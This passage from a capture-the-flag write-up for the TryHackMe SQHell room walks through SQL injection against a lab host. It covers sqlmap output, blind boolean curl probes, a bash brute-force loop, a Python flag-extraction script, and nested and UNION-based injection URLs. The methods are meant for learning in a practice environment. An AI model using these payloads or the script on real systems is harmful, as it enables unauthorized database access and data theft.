[22:50:53] [INFO] fetching entries for table 'flag' in database 'sqhell_5'
Database: sqhell_5
Table: flag
[1 entry]
+----+---------------------------------------------+
| id | flag                                        |
+----+---------------------------------------------+
| 1  | THM{FLAG5:<HIDDEN>}                         |
+----+---------------------------------------------+
[22:50:53] [INFO] table 'sqhell_5.flag' dumped to CSV file '/root/.local/share/sqlmap/output/sqhell.thm/dump/sqhell_5/flag.csv'
[22:50:53] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/sqhell.thm'
[*] ending @ 22:50:53 /2021-06-10/
```

We have the flag with only two runs of SQLMap, nice and simple!

Let’s move on to the next flag.

### Flag 3 - Blind/Boolean - Browser Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-3---blindboolean---browser-method) <a href="#flag-3---blindboolean---browser-method" id="flag-3---blindboolean---browser-method"></a>

I found [this](https://www.hackingarticles.in/beginner-guide-sql-injection-boolean-based-part-2/) guide, which is a good in depth look at blind or boolean based attacks.

First looking at the Register page to see what we are dealing with:

![sqhell-register](https://pencer.io/assets/images/2021-06-14-22-09-41.png)

If we try admin as the user we see a message saying it’s taken:

![sqhell-admin](https://pencer.io/assets/images/2021-06-14-22-10-40.png)

If we try test as the user we see a message saying it’s available:

![sqhell-test](https://pencer.io/assets/images/2021-06-14-22-11-36.png)

Looking at the source code for the page we see how this works:

```
<script>
    $('input[name="username"]').keyup(function(){
        $('.userstatus').html('');
        let username = $(this).val();
        $.getJSON('/register/user-check?username='+ username,function(resp){
            if( resp.available ){
                $('.userstatus').css('color','#80c13d');
                $('.userstatus').html('Username available');
            }else{
                $('.userstatus').css('color','#F00');
                $('.userstatus').html('Username already taken');
            }
        });
    });
</script>
```

The script section calls a function called user-check to see if the name you’ve entered is available. We can visit this endpoint directly:

![sqhell-user-check](https://pencer.io/assets/images/2021-06-14-22-15-40.png)

Here we see the JSON output showing us the username isn’t available. First we test for SQLi:

![sqhell-test-user](https://pencer.io/assets/images/2021-06-14-22-22-09.png)

We still see available is false so we know we can perform SQLi and use the true/false response to confirm our query. Now we know this works our first task is to find the database name. We could continue in the browser, but for speed I’ll switch to curl.

### Flag 3 - Blind/Boolean - Curl Method <a href="#flag-3---blindboolean---curl-method" id="flag-3---blindboolean---curl-method"></a>

Let’s test how many characters are in the database name:

**Kali**

```
curl "http://$VICTIM/register/user-check?username=admin' AND (length(database())) = 1 --+"
```

This tells us the database name length isn’t 1 character long. Next we try two characters:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
curl "http://$VICTIM/register/user-check?username=admin' AND (length(database())) = 2 --+"
```

Same answer for two characters, so we continue adding one and testing until we get a false:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Same answer for two characters, so we continue adding one and testing until we get a false:

**Kali**

```
curl "http://$VICTIM/register/user-check?username=admin' AND (length(database())) = 8 --+"
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This tells us the length of the name of the database is eight characters. Now we want to find what those eight characters are, we can cheat a little as we can guess it’s in the same format as the previous flags. So with the knowledge that it is probably sqhell\_3 let’s test the first character. To do this we need to know the ASCII code for lower case s, which is 115 known by looking at [this](http://www.asciitable.com/) handy table.

Let’s see if the first character is equal to s:

**Kali**

```
curl "http://$VICTIM/register/user-check?username=admin' AND (ascii(substr((select database()),1,1))) = 115 --+"
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

False tells us the letter isn’t available, or in other words there is a match. So we’ve confirmed the first character is s, let’s check for q. I also made this one liner to loop through all uncaptalize letters to make it easier.

**Kali**

```
for (( i=0; i<=255; i++ )); do curl "http://$VICTIM/register/user-check?username=admin' AND (ascii(substr((select database()),2,1))) = $i  --+" && echo "Val: $i";  done
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I kept doing this until the last eighth character. Writing down the results to convert to ASCII

**Kali**

```
for (( i=0; i<=255; i++ )); do curl "http://$VICTIM/register/user-check?username=admin' AND (ascii(substr((select database()),8,1))) = $i  --+" && echo "Val: $i";  done
```

Link: [https://onlinetools.com/ascii/convert-decimal-to-ascii](https://onlinetools.com/ascii/convert-decimal-to-ascii)

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We’ve confirmed the database is called sqhell\_3. Next we would use the same technique to get the table names in the database, of course that would be a long a laborious process. Used this script to get the flag.

**flag.py**

```
import requests
import string

server = "10.10.29.184" # IP OR SERVERNAME IF IN HOST FILE
flag = ""
loop = 1

while chr(125) not in flag:
    for a in range(48,126):
        req = requests.get("http://" + server + f"/register/user-check?username=admin' AND (ASCII(SUBSTR((SELECT flag FROM sqhell_3.flag),{loop},1))) = '{a}'; --+")
        if 'false' in req.text:
             flag += chr(a)
             loop += 1
             print("Finding Flag: ", flag, end="\r")
             break
print("Flag found: ", flag)
```

**Kali**

```
python flag.py
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Flag 4

### Out-of-band - Browser Method <a href="#flag-4---out-of-band---browser-method" id="flag-4---out-of-band---browser-method"></a>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We see her just like on the posts page there is a parameter. Let’s test to see if we can inject like before:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Adding AND 1=1 results in a true statement which proves we can inject here. Now we need to determine the number of columns in the table just like we did for flag 5. We do this the same way using the ORDER BY statement.

So just like before we start with ORDER BY 1, then ORDER BY 2, and so on until we get to ORDER BY 4 where we see an error:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we know how many columns we have we can use a UNION statement to test which ones are visible:

```
http://$VICTIM/user?id=1337 union select 1,2,3
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Here we’ve used a false ID, which would result in an error but instead we’ve used the UNION statement to retrieve the column numbers. Now we know column one and two are useable we can retrieve the user and database:

```
http://$VICTIM/user?id=1337 union select database(),user(),null
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Next we want to see the tables in the database and can use the same query as before:

```
http://$VICTIM/user?id=1337 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
```

However this time when we ask for all tables using group\_concat we only see the one user table:

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We know a different database contains the posts table, but we find the expected flag table can’t be queried here. It’s at this point that we need to go back to the hint about running a query inside a query. And we again need to determine the number of columns:

```
http://$VICTM/user?id=1337 union select "1 order by 1-- -",2,3 from information_schema.tables where table_schema=database()
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Here I’ve just added an ORDER BY query to the end of the UNION SELECT 1, and enclosed it in quotes so it gets evaluated. As before we keep adding columns until we something changes:

```
http://sqhell.thm/user?id=1337 union select "1 order by 1,2,3,4,5-- -",2,3 from information_schema.tables where table_schema=database()
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see at five columns the posts disappear. This tells us there are four columns. Now we can use the same query as before to get the flag from the flag table:

```
http://sqhell.thm/user?id=1337 union select "1 union select 1,flag,3,4 from flag-- -",2,3 from information_schema.tables where table_schema=database()
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## Flag 5

### In-Band/Union - Browser Method <a href="#flag-5---in-bandunion---browser-method" id="flag-5---in-bandunion---browser-method"></a>

The next easiest flag is number five. For this one we’ll be using parameter tampering and a UNION based exploit. I did another TryHackMe room called Jurassic Park where I used the same techniques as follows, you can see that post [here.](https://pencer.io/ctf/ctf-thm-jurassic-park). There’s also helpful articles [here](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example) and [here](https://book.hacktricks.xyz/pentesting-web/sql-injection) that are worth a read.

First let’s see what we have:

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

We’re looking at one of the posts and can see it has a parameter on the end of the URL, in this case it’s ID=1. There’s lots of ways to check if this is vulnerable, probably the easiest is to add a ‘ on the end:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It says there’s an error in our syntax, which tells us our extra character on the end wasn’t removed. We could also do something simple like AND 1=1:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As before we can see the statement was evaluated with our extra part on the end. In this instance AND 1=1 is true so the page appears as normal. Now we know it’s vulnerable we can start to dig deeper.

First we want to know how many columns are in the table. We start at 1 and add columns until we get an error:

```
http://sqhell.thm/post?id=99 union all select 1,2,3,4
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The UNION ALL statement is used to show us which column appears where on the page. We want the output to be visible, otherwise we won’t be able to see the data we retrieve. We can see column three is the main section of the page, so plenty of room for our output. We’ll use that one for all our subsequent commands.

Let’s get the database name:

```
http://sqhell.thm/post?id=99 union all select 1,2,database(),4
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we want the tables in the database:

```
http://sqhell.thm/post?id=99 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Finally we see the tables in the database, flag sounds like the one we’re looking for. Let’s have a look at the contents of it:

```
http://sqhell.thm/post?id=99 union select 1,2,flag,4 from flag
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>















